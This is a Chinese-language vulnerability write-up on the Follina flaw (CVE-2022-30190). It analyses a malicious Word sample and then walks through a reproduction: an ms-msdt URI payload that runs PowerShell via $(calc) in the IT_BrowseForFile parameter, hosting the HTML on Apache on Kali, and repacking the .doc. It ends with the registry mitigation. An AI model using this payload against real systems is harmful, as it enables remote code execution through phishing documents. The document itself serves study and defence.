## 0x00 漏洞概述 

Microsoft Office是由微软公司开发的一套办公软件。Microsoft Support Diagnostic Tool（又称微软支持诊断工具）是一种实用程序，用于排除故障并收集诊断数据以供专业人员分析和解决问题。

> 近日，独立的网络安全研究团队@nao\_sec在推特上发布了关于从白俄罗斯提交的恶意Microsoft Word文档，该文档利用远程模板使用“ms-msdt”MSProtocol URI方案执行PowerShell有效负载。最终确定为Windows中一个未修补的新漏洞。此漏洞成功利用会导致未经身份验证的远程攻击者控制受影响的系统。不久他们就发布了一个公开可用的POC。此零日漏洞成为“Follina”，CVE分配为：CVE-2022-30190。

## 0x03 样本代码分析 

1、打开`word/_rels/document.xml.rels`这段代码，远程请求了一个`RDF5421.html`文件

![](../Images/01b34672f81c25dc90e4e2ce15d3dcf7.png)

2、可以在`any.run`中看到这个`RDF8421.html`文件的内容

![](../Images/e92ff4e1f07ce205d113f2858676e8d6.png)

3、开头是`<html>`标签，中间是一大堆字符`A`，下面这段代码中`window.location.href`的作用是设置一个窗口，`ms-msdt`就是windows诊断工具

![](../Images/fce243b4f8a27e9a03ac3ebea7abf8b5.png)

4、关键在于这里，调用了`powershell.exe`，并且执行的内容进行了`base64`加密

![](../Images/f1368346cd131622bde567cf9143345b.png)

5、解密，将代码换行得出：

```


$cmd = "c:\windows\system32\cmd.exe";
```

`Start-Process $cmd -windowstyle hidden -ArgumentList`就是启动一个隐藏窗口；`/c taskkill /f /im msdt.exe`此命令意为：如果`msdt.exe`正在运行，则终止它。之后的操作不太重要，总之就是执行了`rgb.exe`和`msdt.exe`

**关键就在于这，windows会毫无限制的盲目执行这个powershell，如果我们修改成想执行的代码，就会导致远程代码执行漏洞**

### 关于垃圾字符AAA...的解释

> 注释作用为增加模板文件体积使文件大小大于4096字节，原因和CVE-2021-40444一致，如果文件大小小于4096字节，将会导致客户端使用mshtml!CDwnStm::Read从服务端期望读取4096字节数据时失败，进而导致其调用mshtml!CDwnBindData::TerminateOnApt终止 html 页面的处理，并最终导致其不会调用 mshtml!PostManExecute 执行模板文件中的 js 代码。

参考链接：http://www.hackdig.com/06/hack-678214.htm

以后有时间复现CVE-2021-40444试一下  

## 0x04 漏洞复现 

思路和以往的钓鱼word文档一样，将远程请求的内容改成我们构造的攻击语句就可以了。

先将`any.run`上的`html`文件复制到kali中命名为`exp.html`。或者直接下载也行，只不过我觉着解压还要输入密码比较蛋疼。

![](../Images/4d67ee8703b2c22c7eaa62acde2a95c3.png)

### 弹计算器

先从经典的弹计算器开始，在 `IT_BrowseForFile` 参数的开头至少需要两次`/../`目录遍历，包含在`$()`中的代码将通过`PowerShell`执行，`.exe\"`必须是出现在` IT_BrowseForFile` 参数末尾的最后一个字符串，反斜杠就是转义而已。

```
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc)/.exe\""
;
```

将上面这段代码放入`exp.html`文件中

![](../Images/93e0012da393a0606faf35e8486014aa.png)

### kali配置apache服务与https

具体配置比较长，但是配置起来很简单，无脑复制粘贴配置，重启apache2服务即可。

具体参考此链接：

```
https://techexpert.tips/zh-hans/apache-zh-hans/%E5%9C%A8-apache-%E4%B8%8A%E5%90%AF%E7%94%A8-https/
```

配置完毕测试一下，我这里的默认`apache2`首页之前做实验去掉了`css`而已，访问成功就行。

![](../Images/633b340bc128c1894b5f96b056b8d134.png)

随后将我们之前做的`exp.html`放到`apachce2`默认的目录下

![](../Images/6af7cccc9b7ebfba3a413bd4c8ff3fb5.png)

再修改外部请求内容为攻击机kali的地址

![](../Images/f77b3abb3b5450c140e0763731397288.png)

随后再将之前`unzip .doc`出来的文件重新压缩成`doc`文档

```

zip -r shell.doc word/* _rels/* _rels/ _rels/.rels \[Content_Types\].xml
```

![](../Images/bda0c3e92a1d39358d5e28b30ddeca6a.png)

## 0x06 漏洞修复 

#### 官方修复方案

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190

目前微软暂未针对此漏洞发布安全补丁，提供了临时修复措施进行防护：

#### 手动修复：禁用MSDT URL协议

1、管理员身份运行命令提示符备份注册表项后，执行命令备份注册表

```
reg export
 HKEY_CLASSES_ROOT\ms-msdt filename
```

2、再删除`msdt`

```

reg delete HKEY_CLASSES_ROOT\ms-msdt /f
```

![](../Images/242a2b24fe6977ba9791d8f11254e043.png)

若需要撤销禁用则用管理员身份打开cmd执行：`reg import filename`
